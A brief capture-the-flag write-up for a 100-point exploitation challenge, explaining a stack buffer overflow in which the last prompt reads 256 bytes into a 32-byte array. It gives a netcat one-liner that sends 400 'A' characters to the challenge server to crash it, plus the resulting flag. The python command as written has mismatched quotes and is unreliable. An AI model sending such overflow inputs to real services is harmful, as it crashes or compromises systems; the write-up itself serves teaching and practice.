# Dwojkowy
**Category**: exploitation \
**Points**: 100

## Description
Podobno w niektórych polskich przedszkolach uczy się crashowania binarek?

## Solution
Looking at the source code we can notice four char arrays of size 32. Every answer to the question is getting stored in one of them. The last question however is loading 256 bytes and tries to store it in 32, so we can try to do a buffer overflow.

```
python3 -c 'print "A"*400" | nc 0.cloud.chals.io 27916
```

Binary crashed and server printed the flag

## FLAG
flag{jeszcze_raz_kto_ty_jestes?}